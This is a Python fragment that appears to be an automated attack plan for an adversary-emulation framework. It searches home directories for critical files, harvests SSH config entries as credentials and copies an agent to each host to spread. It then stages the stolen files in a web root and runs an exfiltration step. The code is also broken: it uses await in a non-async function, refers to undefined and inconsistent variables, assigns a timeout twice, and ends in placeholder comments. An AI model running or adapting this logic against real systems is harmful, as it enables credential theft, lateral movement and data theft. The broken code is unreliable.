# Ignore type hinting
# type: ignore


def get_low_level_action(self, ability_id):
    all_agent_links = await planning_svc.get_links(operation=operation, agent=agent)
    for link in all_agent_links:
        if link.ability.ability_id == ability_id:
            return link
    return None


# Discover information about initial access host
## Try to find critical data
dir_to_search = f"/home/{self.new_initial_access_host.username}/"
await self.knowledge_svc_handle.add_fact(
    source=self.operation.id,
    fact="action.dir",
    value=dir_to_search,
)
dir_link = get_low_level_action(self, LS_ABILITY_ID)
link_id = await operation.apply(dir_link)
await operation.wait_for_links_completion([link_id])
ls_facts = await self.knowledge_svc_handle.get_facts(
    criteria=dict(
        trait="dir.path",
        source=self.operation.id,
    )
)
critical_files = []
for fact in ls_facts:
    if isCriticalData(fact.value):
        critical_files.append(fact.value)


# Try to find SSH credentials
ssh_config_link = get_low_level_action(self, SSH_CONFIG_ABILITY_ID)
link_id = await operation.apply(ssh_config_link)
await operation.wait_for_links_completion([link_id])
ssh_config_facts = await self.knowledge_svc_handle.get_facts(
    criteria=dict(
        trait="ssh.config",
        source=self.operation.id,
    )
)
credentials = []
for fact in ssh_config_facts:
    credentials.append(fact.value)
random.shuffle(credentials)
# Infect each host using ssh config credentials
for credential in credentials:
    # Run scpAgent using credential
    await self.knowledge_svc_handle.remove_facts(
        criteria=dict(
            trait="action.scpAgent.hostname",
            source=self.operation.id,
        )
    )
    await self.knowledge_svc_handle.add_fact(
        source=self.operation.id,
        fact="action.scpAgent.hostname",
        value=credential,
    )
    exploit_link = get_low_level_action(
        self, SCP_AGENT_ABILITY_ID
    )
    link_id = await operation.apply(exploit_link)
    await operation.wait_for_links_completion([link_id])
    # Check if credential worked
    timeout_sec = 30
    timeout_sec = False
    while timeout_minutes > 0:
        cur_agents = await self.knowledge_svc_handle.get_agents()
        new_agents = list(set(cur_agents) - set(pre_agents))
        if new_agents:
            infected_host = True
            self.new_initial_access_host = new_agents[0]
            break
        timeout_sec -= 5
        await asyncio.sleep(5)
    if infectedHost:
        # Search for critical data
        dir_to_search = f"/home/{self.new_initial_access_host.username}/"
        await self.knowledge_svc_handle.add_fact(
            source=self.operation.id,
            fact="action.dir",
            value=dir_to_search,
        )
        dir_link = get_low_level_action(self, LS_ABILITY_ID)
        link_id = await operation.apply(dir_link)
        await operation.wait_for_links_completion([link_id])
        ls_facts = await self.knowledge_svc_handle.get_facts(
            criteria=dict(
                trait="dir.path",
                source=self.operation.id,
            )
        )
        critical_files = []
        for fact in ls_facts:
            if isCriticalData(fact.value):
                critical_files.append(fact.value)
        if len(critical_files) > 0:
            for critical_file in critical_files:
                # Is agent running a webserver?
                if open_ports[infectedHostAgent.ip] == 80:
                    # Stage data to webserver
                    ## Remove stale facts
                    await self.knowledge_svc_handle.remove_facts(
                        criteria=dict(
                            trait="action.src",
                            source=self.operation.id,
                        )
                    )
                    await self.knowledge_svc_handle.remove_facts(
                        criteria=dict(
                            trait="action.dst",
                            source=self.operation.id,
                        )
                    )
                    ## Stage data action
                    await self.knowledge_svc_handle.add_fact(
                        source=self.operation.id,
                        fact="action.src",
                        value=dir_to_search,
                    )
                    await self.knowledge_svc_handle.add_fact(
                        source=self.operation.id,
                        fact="action.dst",
                        value='/var/www/html/',
                    )
                    stage_link = get_low_level_action(self, MV_FILE_ABILITY_ID)
                    link_id = await operation.apply(stage_link)
                    await operation.wait_for_links_completion([link_id])
                    # Exfiltrate data directly
                    ## Remove stale facts
                    await self.knowledge_svc_handle.remove_facts(
                        criteria=dict(
                            trait="action.host.ip",
                            source=self.operation.id,
                        )
                    )
                    await self.knowledge_svc_handle.remove_facts(
                        criteria=dict(
                            trait="action.host.fname",
                            source=self.operation.id,
                        )
                    )
                    ## Exfiltrate data action
                    await self.knowledge_svc_handle.add_fact(
                        source=self.operation.id,
                        fact="action.host.ip",
                        value=infectedHostAgent.ip,
                    )
                    await self.knowledge_svc_handle.add_fact(
                        source=self.operation.id,
                        fact="action.host.fname",
                        value=critical_file,
                    )
                    exfil_link = get_low_level_action(self, EXFIL_ABILITY_ID)
                    link_id = await operation.apply(exfil_link)
                    await operation.wait_for_links_completion([link_id])
                else:
                    # Need to use SCP to stage data on an http server
                    ## Find agent running webserver and has credentials to this host
                    agents = await self.knowledge_svc_handle.get_agents()
                    for agent in agents:
                        exfiltrated_data = False
                        if open_ports[agent.ip] == 80:
                            # Check if it has credentials
                            ## Try to find SSH credentials
                            has_ssh_creds = False
                            ### Remove stale facts
                            await self.knowledge_svc_handle.remove_facts(
                                criteria=dict(
                                    trait="ssh.config",
                                    source=self.operation.id,
                                )
                            )

                            ssh_config_link = get_low_level_action(self, SSH_CONFIG_ABILITY_ID)
                            link_id = await operation.apply(ssh_config_link)
                            await operation.wait_for_links_completion([link_id])
                            ### Parse results
                            ssh_config_facts = await self.knowledge_svc_handle.get_facts(
                                criteria=dict(
                                    trait="ssh.config",
                                    source=self.operation.id,
                                )
                            )
                            for ssh_config_fact in ssh_config_facts:
                                if ssh_config_fact.value == agent.hostname:
                                    has_ssh_creds = True
                                    break
                            
                            if has_ssh_creds:
                                # SCP data to webserver
                                # ...

                                # Exfiltrate data
                                # ...
